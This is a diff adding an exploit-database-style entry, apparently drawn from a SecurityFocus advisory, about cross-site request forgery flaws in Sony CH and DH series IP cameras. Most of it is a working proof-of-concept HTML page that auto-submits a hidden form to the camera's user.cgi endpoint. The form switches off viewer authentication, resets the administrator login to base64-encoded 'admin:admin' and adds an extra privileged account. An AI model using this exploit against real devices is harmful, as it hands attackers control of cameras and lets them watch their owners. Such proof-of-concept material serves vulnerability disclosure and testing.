@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/60529/info
+
+Sony CH and DH series IP cameras including SNCCH140, SNCCH180, SNCCH240, SNCCH280, SNCDH140, SNCDH140T, SNCDH180, SNCDH240, SNCDH240T, and SNCDH280 are prone to multiple cross-site request-forgery vulnerabilities.
+
+Exploiting these issues may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks. 
+
+<html>
+<body>
+  <form name="SonyCsRf" action="http://xx.xx.xx.xx/command/user.cgi" method="POST">
+    <input type="Select" name="ViewerModeDefault" value="00000fff">
+    <input type="Hidden" name="ViewerAuthen" value="off">
+    <input type="Hidden" name="Administrator" value="YWRtaW46YWRtaW4=">
+    <input type="Hidden" name="User1" value="xxxx,c0000fff">
+    <input type="Hidden" name="User2" value="xxxx,c0000fff">
+    <input type="Hidden" name="User3" value="dG1wdG1wOnRtcHRtcA==,c0000fff">
+    <input type="Hidden" name="User4" value="Og==,00000fff">
+    <input type="Hidden" name="User5" value="Og==,00000fff">
+    <input type="Hidden" name="User6" value="Og==,00000fff">
+    <input type="Hidden" name="User7" value="Og==,00000fff">
+    <input type="Hidden" name="User8" value="Og==,00000fff">
+    <input type="Hidden" name="User9" value="Og==,00000fff">
+    <input type="Hidden" name="Reload" value="referer">
+    <script>document.SonyCsRf.submit();</script>
+ </form>
+</body>
+</html>
